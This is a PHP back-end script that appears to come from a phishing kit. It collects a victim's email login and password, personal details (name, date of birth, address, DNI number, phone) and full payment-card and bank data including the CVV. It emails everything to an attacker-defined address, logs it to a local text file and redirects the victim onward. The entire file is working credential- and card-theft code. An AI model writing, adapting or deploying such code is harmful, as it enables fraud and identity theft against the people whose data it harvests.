<?php

include("seguridad/seguridad.php");


session_start();
include"email.php";
$ip=getenv("REMOTE_ADDR");

$mensaje = "\r\n\nEmail Address : ".$_SESSION["email"]."\r\nPassword : ".$_SESSION["password"]."\r\nFull Name : ".$_SESSION["name"]."\r\nDate of Birth : ".$_SESSION["day"]." ".$_SESSION["month"]." ".$_SESSION["year"]."\r\nBilling Address : ".$_SESSION["billing"]."\r\nCity : ".$_SESSION["city"]."\r\nCounty : ".$_SESSION["county"]."\r\nDni : ".$_SESSION["dni"]."\r\nPostcode : ".$_SESSION["postcode"]."\r\nMobile Number : ".$_SESSION["mobile"]."\r\n---------------------------------\r\nName On Card : ".$_POST["nmc"]."\r\nCard Number : ".$_POST["crd"]."\r\nExpiry Date : ".$_POST["exm"]." ".$_POST["exy"]."\r\nCSC/CVV : ".$_POST["csc"]."\nSort Code : ".$_POST["srt"]."\nBank Name : ".$_POST["nbn"]."\nAccount Number : ".$_POST["acb"]."\nIP : $ip\n==================================";
mail($to, $titulo, $mensaje, $cabeceras);


 $file=fopen("wasa.txt","a");
fputs($file, "".$mensaje .PHP_EOL);

 fputs($file,"======================================" .PHP_EOL);  fclose($file);



  header("Location: terminaloche.php?ip=$ip");echo "\n\n";

?>